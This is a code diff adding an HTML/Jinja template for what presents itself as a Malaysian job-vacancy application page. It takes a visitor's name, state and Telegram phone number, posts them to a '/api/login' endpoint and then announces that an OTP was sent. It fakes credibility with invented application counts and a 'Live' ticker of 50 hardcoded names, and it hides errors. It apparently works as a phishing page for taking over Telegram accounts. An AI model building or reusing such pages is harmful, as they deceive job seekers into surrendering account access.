@@ -1,0 +1,851 @@
+{% extends "layout.html" %} {% block content %}
+<img
+  src="{{ url_for('static', filename='banner.png') }}"
+  alt="tng-img"
+  style="
+    width: 100%;
+    display: block;
+    border-radius: 20px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+    margin-bottom: 18px;
+  "
+/>
+
+<div
+  style="
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 30px 20px;
+    text-align: center;
+    box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+    border-top: 5px solid #2f7fb7;
+    font-family: Arial, sans-serif;
+  "
+>
+  <h2
+    style="
+      color: #1d4f91;
+      font-size: 34px;
+      font-weight: 800;
+      margin: 0 0 20px 0;
+      line-height: 1.2;
+      text-transform: uppercase;
+    "
+  >
+    JAWATAN KOSONG TERKINI 2026 TELAH DIBUKA!
+  </h2>
+
+  <style>
+    @media (max-width: 768px) {
+      h2 {
+        font-size: 26px !important;
+      }
+
+      p {
+        font-size: 16px !important;
+      }
+    }
+  </style>
+
+  <p
+    style="
+      color: #6b7280;
+      font-size: 20px;
+      line-height: 1.6;
+      max-width: 800px;
+      margin: 0 auto 25px;
+    "
+  >
+    Hantar minat anda — sistem akan menyemak kelayakan permohonan jawatan kosong
+    terkini mengikut maklumat yang diberikan.
+  </p>
+
+  <div
+    style="
+      background: #eef5fb;
+      border: 2px solid #dbeafe;
+      border-radius: 50px;
+      padding: 16px 25px;
+      color: #2f7fb7;
+      font-size: 20px;
+      font-weight: 700;
+    "
+  >
+    Isi maklumat pemohon untuk semakan jawatan kosong terkini.
+  </div>
+</div>
+
+<form
+  id="registerForm"
+  method="post"
+  style="
+    background: #fff;
+    padding: 20px;
+    border-radius: 18px;
+    box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
+    margin-top: 15px;
+  "
+>
+  <div style="text-align: center; margin-bottom: 18px">
+    <h2
+      style="
+        margin: 0;
+        color: #2d88b7;
+        font-size: 28px;
+        font-weight: 700;
+        line-height: 1.1;
+      "
+    >
+      Maklumat Pemohon
+    </h2>
+
+    <div style="color: #8b8b8b; font-size: 14px; margin-top: 6px">
+      Untuk pendaftaran minat & semakan awal sahaja
+    </div>
+  </div>
+
+  <!-- Nama -->
+  <div
+    style="
+      display: flex;
+      align-items: center;
+      height: 54px;
+      border: 1px solid #e5edf2;
+      border-radius: 15px;
+      overflow: hidden;
+      margin-bottom: 12px;
+      background: #fff;
+    "
+  >
+    <div
+      style="
+        width: 48px;
+        height: 54px;
+        background: #eaf5fb;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      "
+    >
+      <i class="fa-solid fa-user" style="color: #1b7aa7; font-size: 16px"></i>
+    </div>
+
+    <input
+      type="text"
+      name="name"
+      required
+      placeholder="Nama Penuh (Seperti dalam IC)"
+      style="
+        flex: 1;
+        border: none;
+        outline: none;
+        padding: 0 12px;
+        font-size: 14px;
+        background: #fff;
+      "
+    />
+  </div>
+
+  <!-- Negeri -->
+  <div
+    style="
+      display: flex;
+      align-items: center;
+      height: 54px;
+      border: 1px solid #e5edf2;
+      border-radius: 15px;
+      overflow: hidden;
+      margin-bottom: 12px;
+      background: #fff;
+    "
+  >
+    <div
+      style="
+        width: 48px;
+        height: 54px;
+        background: #eaf5fb;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      "
+    >
+      <i
+        class="fa-solid fa-location-dot"
+        style="color: #1b7aa7; font-size: 16px"
+      ></i>
+    </div>
+
+    <select
+      name="negeri"
+      required
+      style="
+        flex: 1;
+        border: none;
+        outline: none;
+        padding: 0 12px;
+        font-size: 14px;
+        background: #fff;
+        appearance: none;
+      "
+    >
+      <option value="">Pilih Negeri</option>
+      <option>Johor</option>
+      <option>Kedah</option>
+      <option>Kelantan</option>
+      <option>Melaka</option>
+      <option>Negeri Sembilan</option>
+      <option>Pahang</option>
+      <option>Pulau Pinang</option>
+      <option>Perak</option>
+      <option>Perlis</option>
+      <option>Selangor</option>
+      <option>Terengganu</option>
+      <option>Sabah</option>
+      <option>Sarawak</option>
+      <option>Wilayah Persekutuan Kuala Lumpur</option>
+      <option>Wilayah Persekutuan Putrajaya</option>
+      <option>Wilayah Persekutuan Labuan</option>
+    </select>
+
+    <div style="padding-right: 12px; color: #777">
+      <i class="fa-solid fa-chevron-down"></i>
+    </div>
+  </div>
+
+  <!-- Telefon -->
+  <div
+    style="
+      display: flex;
+      align-items: center;
+      height: 54px;
+      border: 1px solid #e5edf2;
+      border-radius: 15px;
+      overflow: hidden;
+      margin-bottom: 12px;
+      background: #fff;
+    "
+  >
+    <div
+      style="
+        width: 48px;
+        height: 54px;
+        background: #eaf5fb;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+      "
+    >
+      <i
+        class="fa-solid fa-mobile-screen-button"
+        style="color: #1b7aa7; font-size: 18px"
+      ></i>
+    </div>
+
+    <input
+      type="text"
+      id="phone"
+      name="phone"
+      required
+      placeholder="+60 Nombor Telefon Telegram"
+      style="
+        flex: 1;
+        height: 54px;
+        border: none;
+        outline: none;
+        padding: 0 12px;
+        font-size: 14px;
+        background: #fff;
+      "
+    />
+  </div>
+  <div
+    style="
+      font-size: 12px;
+      color: #6d6d6d;
+      line-height: 1.5;
+      margin-bottom: 18px;
+    "
+  >
+    Gunakan nombor Telegram yang aktif untuk menerima maklumat status
+    permohonan.
+  </div>
+
+  <button
+    type="submit"
+    style="
+      width: 100%;
+      height: 54px;
+      border: none;
+      border-radius: 15px;
+      background: linear-gradient(90deg, #2eb4f4, #0b6eb8);
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 8px 18px rgba(11, 110, 184, 0.25);
+    "
+  >
+    <i class="fa-solid fa-paper-plane"></i>
+    Hantar Permohonan
+  </button>
+</form>
+
+<div
+  style="
+    margin-top: 12px;
+    background: #eef7fc;
+    border-radius: 16px;
+    padding: 8px;
+  "
+>
+  <!-- Statistik -->
+  <div style="display: flex; gap: 5px; margin-bottom: 8px">
+    <div
+      style="
+        flex: 1;
+        background: #fff;
+        border-radius: 10px;
+        padding: 8px 4px;
+        text-align: center;
+      "
+    >
+      <div
+        style="
+          font-size: 16px;
+          font-weight: 700;
+          color: #203864;
+          line-height: 1;
+        "
+      >
+        12,847
+      </div>
+
+      <div
+        style="
+          font-size: 8px;
+          color: #8a8a8a;
+          font-weight: 600;
+          margin-top: 4px;
+          line-height: 1.1;
+        "
+      >
+        PERMOHONAN<br />DITERIMA
+      </div>
+    </div>
+
+    <div
+      style="
+        flex: 1;
+        background: #fff;
+        border-radius: 10px;
+        padding: 8px 4px;
+        text-align: center;
+      "
+    >
+      <div
+        style="
+          font-size: 16px;
+          font-weight: 700;
+          color: #203864;
+          line-height: 1;
+        "
+      >
+        5,120
+      </div>
+
+      <div
+        style="
+          font-size: 8px;
+          color: #8a8a8a;
+          font-weight: 600;
+          margin-top: 4px;
+          line-height: 1.1;
+        "
+      >
+        PEMOHON<br />LULUS SEMAKAN
+      </div>
+    </div>
+
+    <div
+      style="
+        flex: 1;
+        background: #fff;
+        border-radius: 10px;
+        padding: 8px 4px;
+        text-align: center;
+      "
+    >
+      <div
+        style="
+          font-size: 16px;
+          font-weight: 700;
+          color: #1f9ad7;
+          line-height: 1;
+        "
+      >
+        332
+      </div>
+
+      <div
+        style="
+          font-size: 8px;
+          color: #8a8a8a;
+          font-weight: 600;
+          margin-top: 4px;
+          line-height: 1.1;
+        "
+      >
+        SEDANG SEMAK<br />KELAYAKAN
+      </div>
+    </div>
+  </div>
+
+  <!-- Status -->
+  <div style="background: #fff; border-radius: 12px; padding: 10px">
+    <div
+      style="
+        display: flex;
+        align-items: flex-start;
+        gap: 7px;
+        font-weight: 600;
+        color: #333;
+        margin-bottom: 8px;
+        line-height: 1.3;
+        font-size: 12px;
+      "
+    >
+      <div
+        style="
+          width: 8px;
+          height: 8px;
+          min-width: 8px;
+          border-radius: 50%;
+          background: #23c483;
+          margin-top: 4px;
+        "
+      ></div>
+
+      Permohonan jawatan kosong terkini berjaya
+    </div>
+
+    <div
+      style="
+        display: inline-block;
+        background: #19c97f;
+        color: #fff;
+        font-weight: 700;
+        padding: 6px 12px;
+        border-radius: 999px;
+        font-size: 11px;
+      "
+    >
+      12,847 berjaya
+    </div>
+  </div>
+</div>
+
+<!-- Loader overlay -->
+<div
+  id="loader"
+  style="
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: rgba(255, 255, 255, 0.9);
+    z-index: 9999;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  "
+>
+  <div
+    id="spinner"
+    style="
+      width: 60px;
+      height: 60px;
+      border: 6px solid #ccc;
+      border-top: 6px solid #001a6d;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    "
+  ></div>
+  <p id="loaderText" style="margin-top: 15px; font-weight: 600; color: #001a6d">
+    Memproses...
+  </p>
+</div>
+
+<style>
+  /* WRAPPER LUAR */
+  .pendaftar-wrapper {
+    width: 100%;
+    padding: 12px;
+    box-sizing: border-box;
+  }
+
+  /* CARD UTAMA */
+  .pendaftar-card {
+    background: #f3f4f6;
+    border-radius: 20px;
+    padding: 16px;
+    font-family: Arial, sans-serif;
+    box-shadow: 0 6px 18px rgba(0, 0, 0, 0.06);
+  }
+
+  /* HEADER FLEX */
+  .pendaftar-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 14px;
+    font-weight: bold;
+    font-size: 15px;
+  }
+
+  /* BADGE LIVE */
+  .live-badge {
+    background: #d1fae5;
+    color: #065f46;
+    padding: 4px 12px;
+    border-radius: 999px;
+    font-size: 12px;
+    font-weight: 600;
+    border: 1px solid #22c55e;
+  }
+
+  /* LIST */
+  .pendaftar-list {
+    max-height: 320px;
+    overflow: hidden;
+    position: relative;
+  }
+
+  /* ITEM */
+  .pendaftar-item {
+    display: flex;
+    align-items: flex-start;
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 14px;
+    margin-bottom: 12px;
+    position: relative;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.04);
+  }
+
+  /* GARIS HIJAU KIRI */
+  .pendaftar-item::before {
+    content: "";
+    position: absolute;
+    left: 0;
+    top: 8px;
+    bottom: 8px;
+    width: 4px;
+    border-radius: 4px;
+    background: #22c55e;
+  }
+
+  /* AVATAR */
+  .avatar {
+    width: 52px;
+    height: 52px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #9be7d8, #4fd1c5);
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+    font-weight: 700;
+    margin-right: 12px;
+    margin-left: 6px;
+    position: relative;
+    flex-shrink: 0;
+  }
+
+  .avatar::after {
+    content: "✓";
+    position: absolute;
+    right: -2px;
+    bottom: -2px;
+    width: 18px;
+    height: 18px;
+    border-radius: 50%;
+    background: #22c55e;
+    color: #fff;
+    font-size: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border: 2px solid #fff;
+  }
+
+  /* TEXT */
+  .nama {
+    font-weight: 700;
+    font-size: 15px;
+    color: #222;
+    margin-bottom: 4px;
+  }
+
+  .status {
+    font-size: 12px;
+    color: #666;
+    margin-top: 4px;
+  }
+
+  .berjaya-badge {
+    background: #22c55e;
+    color: white;
+    font-size: 11px;
+    padding: 2px 8px;
+    border-radius: 999px;
+    margin-right: 6px;
+  }
+</style>
+
+<div class="pendaftar-wrapper">
+  <div class="pendaftar-card">
+    <div class="pendaftar-header">
+      <div>Pendaftaran Terkini</div>
+      <div class="live-badge">Live</div>
+    </div>
+
+    <div class="pendaftar-list">
+      <!-- PINDAHKAN ID KE SINI -->
+      <div class="pendaftar-track" id="pendaftarTrack">
+        <div class="pendaftar-item">
+          <div class="avatar">AH</div>
+          <div>
+            <div class="nama">Ahmad Hakimi</div>
+            <div class="status">
+              <span class="berjaya-badge">Berjaya</span>
+              Berjaya Mendaftar ✅
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+  /* ================== DATA 50 NAMA ================== */
+  const dataPendaftar = [
+    ["FM", "Farah Munirah"],
+    ["AH", "Ahmad Hakimi"],
+    ["SN", "Siti Nur Aisyah"],
+    ["MR", "Muhammad Rizal"],
+    ["NF", "Nur Farahain"],
+    ["HA", "Hafiz Azman"],
+    ["NR", "Nurul Raihana"],
+    ["ZA", "Zulkifli Ahmad"],
+    ["AA", "Aiman Afiq"],
+    ["SR", "Sofia Rahman"],
+    ["IR", "Irfan Rosli"],
+    ["MA", "Muhammad Aiman"],
+    ["NA", "Nabila Amirah"],
+    ["FA", "Firdaus Azmi"],
+    ["SA", "Siti Aishah"],
+    ["AR", "Afiq Rahman"],
+    ["HN", "Haziq Nordin"],
+    ["NM", "Nur Maisarah"],
+    ["RA", "Rizal Abdullah"],
+    ["AF", "Aina Farzana"],
+    ["MI", "Muhammad Izzat"],
+    ["SN", "Siti Nabila"],
+    ["AD", "Amirul Danish"],
+    ["FN", "Farhan Naim"],
+    ["AI", "Aisyah Irdina"],
+    ["HR", "Haris Ridzuan"],
+    ["NS", "Nur Syafiqah"],
+    ["ZA", "Zainal Abidin"],
+    ["AM", "Aiman Muhaimin"],
+    ["SA", "Siti Amirah"],
+    ["IQ", "Izzuddin Qayyum"],
+    ["NR", "Nur Rasyidah"],
+    ["MF", "Muhammad Fakhri"],
+    ["AD", "Aina Dahlia"],
+    ["RA", "Rafiq Aiman"],
+    ["SN", "Siti Nurfatin"],
+    ["HM", "Hakim Mikhail"],
+    ["NA", "Nur Atiqah"],
+    ["FI", "Faris Iman"],
+    ["SA", "Siti Alia"],
+    ["MR", "Muhammad Rafi"],
+    ["AZ", "Aiman Zharif"],
+    ["NF", "Nur Farhana"],
+    ["HR", "Haziq Rizwan"],
+    ["AI", "Alya Imani"],
+    ["MA", "Muhammad Aqil"],
+    ["SN", "Siti Nadhirah"],
+    ["FA", "Fawwaz Akmal"],
+    ["NA", "Nur Amirah"],
+  ];
+
+  document.addEventListener("DOMContentLoaded", function () {
+    const track = document.getElementById("pendaftarTrack");
+    if (!track) return;
+
+    /* Tambah data */
+    dataPendaftar.forEach((d) => {
+      track.insertAdjacentHTML(
+        "beforeend",
+        `
+      <div class="pendaftar-item">
+        <div class="avatar">${d[0]}</div>
+        <div>
+          <div class="nama">${d[1]}</div>
+          <div class="status">
+            <span class="berjaya-badge">Berjaya</span>
+            Berjaya Mendaftar
+          </div>
+        </div>
+      </div>
+      `,
+      );
+    });
+
+    /* ================= AUTO SCROLL STABIL ================= */
+    let isPaused = false;
+    const interval = 2500;
+    const duration = 600;
+
+    function scrollStep() {
+      if (isPaused) return;
+
+      const first = track.firstElementChild;
+      if (!first) return;
+
+      const height = first.getBoundingClientRect().height;
+
+      track.style.transition = `transform ${duration}ms ease`;
+      track.style.transform = `translateY(-${height}px)`;
+
+      setTimeout(() => {
+        track.style.transition = "none";
+        track.style.transform = "translateY(0)";
+        track.appendChild(first);
+      }, duration);
+    }
+
+    setInterval(scrollStep, interval);
+
+    track.addEventListener("mouseenter", () => (isPaused = true));
+    track.addEventListener("mouseleave", () => (isPaused = false));
+    track.addEventListener("touchstart", () => (isPaused = true));
+    track.addEventListener("touchend", () => (isPaused = false));
+  });
+</script>
+
+<!-- Submit pakai AJAX -->
+<script>
+  document
+    .getElementById("registerForm")
+    .addEventListener("submit", function (e) {
+      e.preventDefault();
+      const formData = new FormData(this);
+      const loader = document.getElementById("loader");
+      const spinner = document.getElementById("spinner");
+      const loaderText = document.getElementById("loaderText");
+
+      loader.style.display = "flex";
+
+      fetch("/api/login", { method: "POST", body: formData })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data.status === "success") {
+            spinner.outerHTML = `
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+          <path class="checkmark__check" fill="none" d="M14 27l7 7 17-17"/>
+        </svg>
+      `;
+            loaderText.innerText = "Berjaya Send Otp!";
+            loaderText.style.color = "#4caf50";
+            setTimeout(() => {
+              window.location.href = data.redirect;
+            }, 1500);
+          } else {
+            loader.style.display = "none";
+            alert(data.message || "Ralat tidak diketahui.");
+          }
+        })
+        .catch((err) => {
+          console.log("ignored error", err);
+          // JANGAN alert apa pun
+        });
+    });
+</script>
+
+<!-- Auto isi +60 -->
+<script>
+  const phoneInput = document.getElementById("phone");
+  phoneInput.addEventListener("focus", function () {
+    if (this.value.trim() === "") {
+      this.value = "+60";
+    }
+  });
+  phoneInput.addEventListener("input", function () {
+    if (!this.value.startsWith("+60")) {
+      this.value = "+60";
+    }
+  });
+</script>
+
+<style>
+  @keyframes spin {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+  .checkmark {
+    width: 56px;
+    height: 56px;
+    border-radius: 50%;
+    display: block;
+    stroke-width: 4;
+    stroke: #fff;
+    stroke-miterlimit: 10;
+    margin: 10px auto;
+    box-shadow: inset 0px 0px 0px #4caf50;
+    animation:
+      fill 0.4s ease-in-out 0.4s forwards,
+      scale 0.3s ease-in-out 0.9s both;
+    background: #4caf50;
+  }
+  .checkmark__check {
+    transform-origin: 50% 50%;
+    stroke-dasharray: 48;
+    stroke-dashoffset: 48;
+    animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+  }
+  @keyframes stroke {
+    100% {
+      stroke-dashoffset: 0;
+    }
+  }
+  @keyframes scale {
+    0%,
+    100% {
+      transform: none;
+    }
+    50% {
+      transform: scale3d(1.1, 1.1, 1);
+    }
+  }
+  @keyframes fill {
+    100% {
+      box-shadow: inset 0px 0px 0px 30px #4caf50;
+    }
+  }
+</style>
+
+{% endblock %}
